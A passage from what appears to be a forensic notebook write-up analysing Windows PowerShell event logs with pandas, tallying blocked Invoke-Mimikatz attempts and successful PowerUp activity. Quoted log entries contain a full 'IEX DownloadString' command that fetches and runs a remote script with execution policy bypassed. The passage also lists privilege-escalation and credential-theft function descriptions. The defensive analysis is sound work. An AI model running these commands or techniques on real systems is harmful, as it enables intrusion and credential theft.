+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">powershell_df</span> <span class="o">=</span> <span class="n">powershell_df</span><span class="o">.</span><span class="n">assign</span><span class="p">(</span><span class="n">FunctionDescription</span><span class="o">=</span><span class="n">functions_descriptions</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Having such a rich, preprocessed dataset, we can answer the questions regarding the actions which failed, as well as those which succeeded.</p>
+</section>
+<section id="malicious-activity-which-got-blocked-or-failed-an-overview">
+<h2>Malicious activity which got blocked or failed: an overview<a class="headerlink" href="#malicious-activity-which-got-blocked-or-failed-an-overview" title="Permalink to this headline">#</a></h2>
+<p>Having all new attributes required for the further analysis, we can generate a report on the failed activities.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1) How many were blocked&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">sum</span><span class="p">(</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">2) Which account executed them&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][</span><span class="s2">&quot;UserContext&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">3) The (unique) URLs the script accessed/tried to access&quot;</span><span class="p">)</span>
+<span class="n">to_print</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">links</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][</span><span class="s2">&quot;URLs&quot;</span><span class="p">]:</span>
+    <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">pd</span><span class="o">.</span><span class="n">Series</span><span class="p">(</span><span class="n">links</span><span class="p">)</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+        <span class="n">to_print</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">link</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">pd</span><span class="o">.</span><span class="n">Series</span><span class="p">(</span><span class="n">to_print</span><span class="p">)</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">4) Which functions of the script got blocked&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">function</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][</span><span class="s2">&quot;FunctionName&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">function</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">function</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">description</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][</span><span class="s2">&quot;FunctionDescription&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Description</span><span class="se">\n</span><span class="s2">&gt; </span><span class="si">{</span><span class="n">description</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">5) What is the TaskDisplayName for these messages&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">taskName</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][</span><span class="s2">&quot;TaskDisplayName&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">taskName</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">6) What is the date and time of these blocked actions&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">record</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][[</span><span class="s2">&quot;Date&quot;</span><span class="p">,</span> <span class="s2">&quot;Time&quot;</span><span class="p">]]</span><span class="o">.</span><span class="n">iterrows</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">record</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">record</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>1) How many were blocked
+9
+
+2) Which account executed them
+&gt; WIN-PTFPHFCRDJ0\user
+
+3) The (unique) URLs the script accessed/tried to access
+&gt; https://gist.githubusercontent.com/phwRi7EUp/146c73e8d28eab5c8b546861e06226e7/raw/881106760796a219711035fba797bafe76f22368/SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1
+&gt; https://gist.githubusercontent.com/hiddenblueteamer/b1dab4113e5d0b2ed4dfa02d7853aef0/raw/ac9327b6603a911057fed868e725f7cf5a52bca4/SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1
+&gt; https://gist.githubusercontent.com/blueteampathway/c5735d8a38a02e1cb903a53c6ba860e7/raw/e5caae5b0e2537a5891d71d127866733a367add4/gistfile1.txt
+
+4) Which functions of the script got blocked
+&gt; Invoke-Mimikatz
+Description
+&gt; None
+
+5) What is the TaskDisplayName for these messages
+&gt; Executing Pipeline
+
+6) What is the date and time of these blocked actions
+26/10/2020 19:39:51
+26/10/2020 19:39:33
+26/10/2020 08:58:30
+26/10/2020 08:54:18
+22/10/2020 15:06:59
+22/10/2020 15:06:59
+22/10/2020 15:06:59
+22/10/2020 15:06:59
+22/10/2020 15:06:59
+</pre></div>
+</div>
+<p>And let us save these finding to a text file.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;simple_analysis_reports/4_SUMMARY_report_on_failed_actions.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;1) How many were blocked</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="nb">sum</span><span class="p">(</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">2) Which account executed them</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][</span><span class="s2">&quot;UserContext&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">3) The (unique) URLs the script accessed/tried to access</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">to_print</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">links</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][</span><span class="s2">&quot;URLs&quot;</span><span class="p">]:</span>
+        <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">pd</span><span class="o">.</span><span class="n">Series</span><span class="p">(</span><span class="n">links</span><span class="p">)</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+            <span class="n">to_print</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">link</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">pd</span><span class="o">.</span><span class="n">Series</span><span class="p">(</span><span class="n">to_print</span><span class="p">)</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">4) Which functions of the script got blocked</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">function</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][</span><span class="s2">&quot;FunctionName&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">function</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">function</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">description</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][</span><span class="s2">&quot;FunctionDescription&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Description</span><span class="se">\n</span><span class="s2">&gt; </span><span class="si">{</span><span class="n">description</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">5) What is the TaskDisplayName for these messages</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">taskName</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][</span><span class="s2">&quot;TaskDisplayName&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">taskName</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">6) What is the date and time of these actions</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">record</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][[</span><span class="s2">&quot;Date&quot;</span><span class="p">,</span> <span class="s2">&quot;Time&quot;</span><span class="p">]]</span><span class="o">.</span><span class="n">iterrows</span><span class="p">():</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">record</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">record</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>All in all, we can conclude that 9 actions were blocked or failed. <br><br>
+One account was used to execute the scripts in its context and this was ‘user’ account on WIN-PTFPHFCRDJ0 device. <br><br>
+There were attempts to access 3 URLs, all of them related to content hosted on GitHub. Only the first one works, the other two return 404 response code upon accessing the URL. The function which was blocked is Invoke-Mimikatz and the script did not provide descriptions on this functionality. Although, the first URL contained the function’s code as well as synopsis section which provides more details on this part of the used script. Mimikatz is an exploit which allows for capturing plaintext credentials from memory. Below, the description obtained by accessing the resource at the first URL address (<a class="reference external" href="https://gist">https://gist</a>.[git]<a class="reference external" href="http://hubusercontent.com/phwRi7EUp">hubusercontent.com/phwRi7EUp</a>): <br><br>
+<strong>This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
+dump credentials without ever writing the mimikatz binary to disk.
+The script has a ComputerName parameter which allows it to be executed against multiple computers.
+This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.</strong>
+<br><br>
+The TaskDisplayName for these actions was <em>Executing Pipeline</em> category only.<br>
+We can clearly see that the attempts started on the 22nd and were continued on the 26th October.</p>
+<p>We can check the TaskDisplayName attribute in terms of <em>Executing Pipeline</em> categorical value for the <strong>successful</strong> actions to finish this part of the analysis.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">powershell_df</span><span class="p">[(</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">TaskDisplayName</span> <span class="o">==</span> <span class="s2">&quot;Executing Pipeline&quot;</span><span class="p">)]))</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>2
+</pre></div>
+</div>
+<p>Now, we can read these two event messages to see what was executed.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[(</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">TaskDisplayName</span> <span class="o">==</span> <span class="s2">&quot;Executing Pipeline&quot;</span><span class="p">)][</span><span class="s2">&quot;Message&quot;</span><span class="p">]:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>CommandInvocation(Add-Type): &quot;Add-Type&quot;
+ParameterBinding(Add-Type): name=&quot;AssemblyName&quot;; value=&quot;System.Core&quot;
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1
+        Host ID = 64b188be-5af0-47d4-a9d6-934a93dbd615
+        Host Application = powershell -ep bypass -c IEX (New-Object Net.WeBcLIENT).Downloadstring(&#39;https://gist.githubusercontent.com/blueteampathway/c5735d8a38a02e1cb903a53c6ba860e7/raw/e5caae5b0e2537a5891d71d127866733a367add4/gistfile1.txt&#39;);Invoke-AllChecks
+        Engine Version = 5.1.17763.1
+        Runspace ID = 9584e18e-a650-45d6-828d-f57b3bf92e41
+        Pipeline ID = 1
+        Command Name = Add-Type
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 25
+        User = WIN-PTFPHFCRDJ0\user
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+
+
+
+CommandInvocation(Add-Type): &quot;Add-Type&quot;
+ParameterBinding(Add-Type): name=&quot;AssemblyName&quot;; value=&quot;System.Security&quot;
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1
+        Host ID = 64b188be-5af0-47d4-a9d6-934a93dbd615
+        Host Application = powershell -ep bypass -c IEX (New-Object Net.WeBcLIENT).Downloadstring(&#39;https://gist.githubusercontent.com/blueteampathway/c5735d8a38a02e1cb903a53c6ba860e7/raw/e5caae5b0e2537a5891d71d127866733a367add4/gistfile1.txt&#39;);Invoke-AllChecks
+        Engine Version = 5.1.17763.1
+        Runspace ID = 9584e18e-a650-45d6-828d-f57b3bf92e41
+        Pipeline ID = 1
+        Command Name = Add-Type
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 23
+        User = WIN-PTFPHFCRDJ0\user
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;simple_analysis_reports/5_executing_pipeline_category_successful_actions.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[(</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">TaskDisplayName</span> <span class="o">==</span> <span class="s2">&quot;Executing Pipeline&quot;</span><span class="p">)][</span><span class="s2">&quot;Message&quot;</span><span class="p">]:</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>The events suggest that these were successful attempts to download text files, bypassing the execution policy for PowerShell (-ep bypass). Unfortunately, the repository is not found and the investigation based on the assumption that this text file might still exist somewhere on the Internet did not reveal any particular details which could lead to further information on this file.</p>
+</section>
+<section id="successful-malicious-activity">
+<h2>Successful malicious activity<a class="headerlink" href="#successful-malicious-activity" title="Permalink to this headline">#</a></h2>
+<p>Now, let us focus on the successful actions.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1) How many were successful&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="nb">sum</span><span class="p">(</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">2) Which account executed them&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;UserContext&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">3) The (unique) URLs embedded in the scripts:&quot;</span><span class="p">)</span>
+<span class="n">to_print</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">links</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;URLs&quot;</span><span class="p">]:</span>
+    <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">pd</span><span class="o">.</span><span class="n">Series</span><span class="p">(</span><span class="n">links</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="s2">&quot;object&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+        <span class="n">to_print</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">link</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">pd</span><span class="o">.</span><span class="n">Series</span><span class="p">(</span><span class="n">to_print</span><span class="p">)</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">4) Which functions of the script got executed&quot;</span><span class="p">)</span>
+
+<span class="n">repetitions</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">])):</span>
+    <span class="n">function</span> <span class="o">=</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;FunctionName&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
+    <span class="n">description</span> <span class="o">=</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;FunctionDescription&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">function</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">function</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">repetitions</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&gt; </span><span class="si">{</span><span class="n">function</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">repetitions</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">function</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Description:</span><span class="se">\n</span><span class="si">{</span><span class="n">description</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">continue</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">5) What is the TaskDisplayName for these messages&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">taskName</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;TaskDisplayName&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">taskName</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">6) What is the date and time of these actions&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][[</span><span class="s2">&quot;Date&quot;</span><span class="p">,</span> <span class="s2">&quot;Time&quot;</span><span class="p">]]</span><span class="o">.</span><span class="n">groupby</span><span class="p">(</span><span class="s2">&quot;Date&quot;</span><span class="p">)[</span><span class="s2">&quot;Time&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">value_counts</span><span class="p">())</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>1) How many were successful
+140
+
+2) Which account executed them
+&gt; WIN-PTFPHFCRDJ0\user
+
+3) The (unique) URLs embedded in the scripts:
+&gt; https://gist.githubusercontent.com/blueteampathway/c5735d8a38a02e1cb903a53c6ba860e7/raw/e5caae5b0e2537a5891d71d127866733a367add4/gistfile1.txt
+&gt; https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
+&gt; https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
+&gt; http://www.fuzzysecurity.com/tutorials/16.html
+&gt; https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
+&gt; https://www.mandiant.com/blog/malware-persistence-windows-registry/
+&gt; http://forum.sysinternals.com/tip-easy-way-to-enable-privileges_topic15745.html
+&gt; http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
+&gt; https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
+&gt; http://www.greyhathacker.net/?p=738
+
+4) Which functions of the script got executed
+
+&gt; Invoke-EventVwrBypass
+
+Description:
+Bypasses UAC by performing an image hijack on the .msc file extension
+Only tested on Windows 7 and Windows 10
+
+&gt; Write-UserAddMSI
+
+Description:
+Writes out a precompiled MSI installer that prompts for a user/group addition.
+This function can be used to abuse Get-RegistryAlwaysInstallElevated.
+
+&gt; Get-SiteListPassword
+
+Description:
+Retrieves the plaintext passwords for found McAfee&#39;s SiteList.xml files.
+Based on Jerome Nokin (@funoverip)&#39;s Python solution (in links).
+
+&gt; Get-ModifiableScheduledTaskFile
+
+Description:
+Returns scheduled tasks where the current user can modify any file
+in the associated task action string.
+
+&gt; Get-RegistryAlwaysInstallElevated
+
+Description:
+Checks if any of the AlwaysInstallElevated registry keys are set.
+
+&gt; Find-ProcessDLLHijack
+
+Description:
+Finds all DLL hijack locations for currently running processes.
+
+&gt; Install-ServiceBinary
+
+Description:
+Replaces the service binary for the specified service with one that executes
+a specified command as SYSTEM.
+
+&gt; Invoke-ServiceAbuse
+
+Description:
+Abuses a function the current user has configuration rights on in order
+to add a local administrator or execute a custom command.
+
+&gt; Test-ServiceDaclPermission
+
